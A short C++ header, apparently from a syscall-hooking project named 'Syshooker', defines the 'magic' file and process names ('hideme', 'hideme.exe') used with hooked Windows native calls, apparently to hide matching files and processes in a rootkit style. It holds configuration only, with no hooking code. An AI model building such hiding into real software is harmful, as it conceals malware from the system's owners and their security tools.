#pragma once
#define SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS 5 // defined in 'ntint.h'

struct SyshookerSettings {
	wchar_t NtCreateFileMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtWriteFileMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtQueryDirectoryFileExMagicName[MAX_PATH_SYSHOOKER];
	wchar_t NtQuerySystemInformationProcessMagicName[MAX_PATH_SYSHOOKER];
};

SyshookerSettings Settings = {
	L"hideme",		// NtCreateFileMagicName
	L"wassup",		// NtWriteFileMagicName
	L"hideme",		// NtQueryDirectoryFileExMagicName
	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
};